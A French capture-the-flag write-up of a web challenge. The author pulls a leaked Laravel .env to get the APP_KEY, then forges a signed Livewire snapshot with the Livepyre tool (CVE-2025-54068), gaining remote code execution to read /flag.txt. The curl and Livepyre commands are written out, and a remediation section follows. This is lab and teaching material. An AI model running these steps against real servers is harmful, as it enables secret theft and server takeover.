# Kiyena — un .env qui fuite, l'APP_KEY, et Livewire qui désérialise

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/kiyena/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Une billetterie Laravel/Livewire 3.6.3 laisse traîner son `.env`
> dans le webroot : je récupère l'`APP_KEY`. Livewire signe ses snapshots avec
> cette clé, donc avec la clé je forge un snapshot malveillant (CVE-2025-54068)
> qui désérialise un objet PHP arbitraire côté serveur → RCE → `/flag.txt`. Les
> comptes admin de la base SQLite ne sont qu'un rabbit hole. **Flag :**
> `NCTF{…}`.

## 1. Briefing

Challenge web de la finale : « Festival Kiyena », une billetterie Laravel avec
des composants Livewire. L'objectif est `/flag.txt` sur le serveur.

## 2. Reconnaissance

```
GET /         → accueil du festival
GET /tickets  → composant Livewire (achat de billets)
GET /.env     → fuite ! APP_KEY=base64:...
GET /kiyena.sqlite → base SQLite avec des comptes admin
```

La base SQLite donne des comptes crackables (`sunshine`, `iloveyou`…), mais
`/admin` est un cul-de-sac. Je l'ai suivi un moment avant de comprendre que le
vrai sujet, c'est l'`APP_KEY` plus la version de Livewire.

## 3. Analyse

Les snapshots Livewire — l'état sérialisé du composant renvoyé à chaque requête
XHR — sont **signés avec l'`APP_KEY`** de Laravel. CVE-2025-54068 : avec la clé,
je peux forger un snapshot contenant un objet PHP arbitraire que le serveur
désérialise en traitant `/livewire/update`. Donc fuite du `.env` = RCE.

Je confirme la version en inspectant les requêtes XHR vers `/livewire/update` :
Livewire **3.6.3**, vulnérable.

## 4. Exploitation

### Étape 1 — récupérer l'APP_KEY

```bash
curl -s http://<TARGET>:34000/.env | grep APP_KEY
# APP_KEY=base64:XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Étape 2 — forger le snapshot avec Livepyre

J'utilise [Livepyre](https://github.com/synacktiv/Livepyre) (Synacktiv), qui
automatise la forge du snapshot signé :

```bash
git clone https://github.com/synacktiv/Livepyre && cd Livepyre
pip install -r requirements.txt
./Livepyre.py -u http://<TARGET>:34000/tickets -a '<APP_KEY>' \
    -f system -p 'cat /flag.txt'
```

Livepyre détecte Livewire 3.6.3, signe un snapshot avec l'`APP_KEY`, l'envoie sur
`/livewire/update`, et ma commande s'exécute côté serveur.

## 5. Flag

```text
NCTF{…}
```

## 6. Impasses & leurres

- **Les comptes SQLite** (`/kiyena.sqlite`) et `/admin` sont un rabbit hole : on
  peut cracker les mots de passe, ça ne mène nulle part.
- **Sans `APP_KEY`**, l'exploit reste possible si un paramètre du composant est
  typé objet (Livepyre brute-force), mais ici le `.env` donne la clé directement.

## 7. Leçons & remédiation

- **Le `.env` n'est jamais servi** : le mettre hors du webroot, et bloquer
  `/.env`, `/.git`, `*.sqlite` au niveau du serveur.
- **Faire tourner l'`APP_KEY`** après toute fuite — c'est la racine de confiance
  de toute la signature Laravel.
- **Mettre à jour Livewire** (correctif de CVE-2025-54068) ; ne jamais
  désérialiser un état client sans intégrité **et** typage stricts.
